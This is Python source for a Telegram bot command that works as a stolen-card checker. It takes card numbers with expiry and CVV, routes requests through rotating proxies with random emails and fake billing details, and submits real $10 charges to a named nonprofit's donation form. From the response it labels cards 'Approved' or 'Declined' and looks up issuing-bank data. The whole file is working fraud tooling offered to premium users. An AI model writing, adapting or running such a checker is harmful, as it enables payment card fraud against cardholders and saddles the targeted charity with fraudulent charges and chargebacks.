import requests as r 
import string, random, time
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode

BIN_API = "https://bins.antipublic.cc/bins/"
name_gate = "Authnet"
subtype = "10$ Charged"
command = "an"

@Client.on_message(filters.command([f"{name_gate}", f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False))
async def gateway(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    cc_check = await get_live(card, msg) 

def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = [{'http': line.strip()} for line in file if line.strip()]
    return proxies

def getIndex(response):
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(response.text)
        
def getStr(text:str, a:str, b:str) -> str:
    return text.split(a)[1].split(b)[0]

def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'example.com']
    longitud = random.randint(8, 12) 
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo

def open_files(file):
    with open(file, 'r') as f: return [line.strip() for line in f]

async def get_live(card, msg):
    card = card.replace(":", "|").replace("/", "|").replace(" ", "|")
    card_details = card.split("|")
    ccn = card_details[0]
    month = card_details[1]
    year = card_details[2]
    cvv = card_details[3]  

    if card[0] == '4':
        card_type = "Visa"
    elif card[0] == '5':
        card_type = 'MC'
    elif card[0] == '3':
        card_type = "AmEx"

    session = r.Session()
    proxies = load_proxies("src/extras/proxies.txt")
    proxy = random.choice(proxies)
    email = email_generator()
    initial_time = time.perf_counter()
    BIN = card[0:6]
    data_bin = r.get(BIN_API+BIN).json()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    current_time = datetime.now().strftime("%D - %H:%M:%S")
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
    }

    response = session.get('https://pacificderm.org/foundation/donate/', headers=headers, proxies=proxy)
    token1 = getStr(response.text, 'type="hidden" name="TOKEN', '" value="')
    site_token = f'TOKEN{token1}'
    token_value = getStr(response.text, f'{site_token}" value="', '" />')

    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['brand']}</code> - <code>{data_bin['type']}</code> - <code>{data_bin['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin['country_name']} {data_bin['country_flag']}</code>"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second Requests: Making the payment ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://pacificderm.org',
        'DNT': '1',
        'Sec-GPC': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://pacificderm.org/foundation/donate/',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=0, i',
    }

    data = {
        'amount': '10',
        'donation_type': '1',
        'honor_other': '',
        'credit_card': 'Visa',
        'credit_card_number': ccn,
        'expiration_month': month,
        'expiration_year': year,
        'cvv': cvv,
        'billing_first_name': 'Leonel',
        'billing_last_name': 'Molina',
        'email': email,
        'billing_country': 'US',
        'billing_address': '756',
        'billing_city': 'New York',
        'billing_state': '',
        'billing_state_us': 'NY',
        'billing_postal_code': '10080',
        'billing_telephone': '7594564568',
        'website2': '',
        f'{site_token}': f'{token_value}',
    }

    response = session.post('https://pacificderm.org/foundation/donate/', headers=headers, data=data, proxies=proxy)

    BIN = card[0:6]
    data = r.get(BIN_API+BIN).json()
    final_time = time.perf_counter() - initial_time

    if "Transaction Error" in response.text:
        error_msg = getStr(response.text, 'attention"> ', ' </p>')
        
        if "The card code is invalid" in error_msg: 
            status = "Approved CCN ✅"
            response = error_msg

        else: 
            status = "Declined ❌"
            response = error_msg
        
    elif "Your donation has been processed successfully." in response.text: 
        status = "Approved ✅"
        response = "Your donation has been processed successfully."

    
    card_response = f"""<b>#Authnet_Donate ($an) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {status}<b> 
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {response}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
    await msg.edit_text(card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
